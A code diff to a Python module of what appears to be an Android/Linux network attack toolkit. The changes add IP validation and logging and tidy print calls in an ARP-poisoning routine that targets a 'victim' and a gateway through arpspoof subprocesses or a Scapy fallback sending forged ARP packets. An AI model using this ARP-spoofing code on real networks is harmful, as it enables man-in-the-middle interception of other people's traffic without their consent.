@@ -22,6 +22,7 @@ in Termux. On Linux: apt install dsniff. Otherwise, install scapy
 (`pip install scapy`) and the native Python fallback will be used.
 """
 
+import ipaddress
 import shutil
 import subprocess
 import sys
@@ -29,19 +30,32 @@ import time
 
 from rich import print as rprint
 
+from droidnet.core.logger import get_logger
 from droidnet.platform.utils import check_root, get_default_iface
 
 # Scapy is optional — only used if arpspoof is missing.
 try:
-    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf as _scapy_conf
+    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr
     _SCAPY_OK = True
 except ImportError:
     _SCAPY_OK = False
 
 
+log = get_logger(__name__)
+
+
 def _arpspoof_available() -> bool:
     """Return True if arpspoof is found in PATH."""
     return shutil.which("arpspoof") is not None
+
+
+def _valid_ip(value: str) -> bool:
+    """True if *value* is a well-formed IPv4/IPv6 address."""
+    try:
+        ipaddress.ip_address(value)
+        return True
+    except ValueError:
+        return False
 
 
 # ══════════════════════════════════════════════════════════════════
@@ -120,7 +134,7 @@ def _poison_scapy(
             rprint(f"  [dim][→] Poisoned packets: {sent}[/dim]", end="\r")
             time.sleep(interval)
     except KeyboardInterrupt:
-        rprint(f"\n[bold yellow][!][/bold yellow] Restoring ARP (5 bursts)...")
+        rprint("\n[bold yellow][!][/bold yellow] Restoring ARP (5 bursts)...")
     finally:
         for _ in range(5):
             sendp(restore_target,  iface=iface, verbose=False)
@@ -144,10 +158,18 @@ def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
         gateway_ip : IP of the network gateway/router.
         iface      : Network interface to use (default: wlan0).
     """
+    if not _valid_ip(target_ip):
+        rprint(f"[red][✗] Invalid victim IP: {target_ip}[/red]")
+        return
+    if not _valid_ip(gateway_ip):
+        rprint(f"[red][✗] Invalid gateway IP: {gateway_ip}[/red]")
+        return
+
+    log.info("arp poison start victim=%s gateway=%s iface=%s", target_ip, gateway_ip, iface)
     if not _arpspoof_available():
         if _SCAPY_OK:
             rprint("[yellow][!][/yellow] arpspoof not found; using Scapy fallback.")
-            rprint(f"[bold red][☠][/bold red] Poisoning ARP (Scapy)...")
+            rprint("[bold red][☠][/bold red] Poisoning ARP (Scapy)...")
             rprint(f"  Victim : [cyan]{target_ip}[/cyan]")
             rprint(f"  Gateway : [cyan]{gateway_ip}[/cyan]")
             rprint(f"  Iface   : [cyan]{iface}[/cyan]")
@@ -158,11 +180,11 @@ def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
         rprint("[dim]On Termux: pip install scapy (Android usually blocks raw sockets)[/dim]")
         return
 
-    rprint(f"[bold red][☠][/bold red] Poisoning ARP...")
+    rprint("[bold red][☠][/bold red] Poisoning ARP...")
     rprint(f"  Victim : [cyan]{target_ip}[/cyan]")
     rprint(f"  Gateway : [cyan]{gateway_ip}[/cyan]")
     rprint(f"  Iface   : [cyan]{iface}[/cyan]")
-    rprint(f"  [dim]Ctrl+C to stop and restore.[/dim]\n")
+    rprint("  [dim]Ctrl+C to stop and restore.[/dim]\n")
 
     proc1 = subprocess.Popen(
         ["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
@@ -185,7 +207,7 @@ def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
         if proc1.poll() is not None or proc2.poll() is not None:
             rprint("[bold yellow][!][/bold yellow] An arpspoof process terminated. Cleaning up...")
     except KeyboardInterrupt:
-        rprint(f"\n[bold yellow][!][/bold yellow] Stopping and restoring network...")
+        rprint("\n[bold yellow][!][/bold yellow] Stopping and restoring network...")
     finally:
         for p in (proc1, proc2):
             if p.poll() is None:
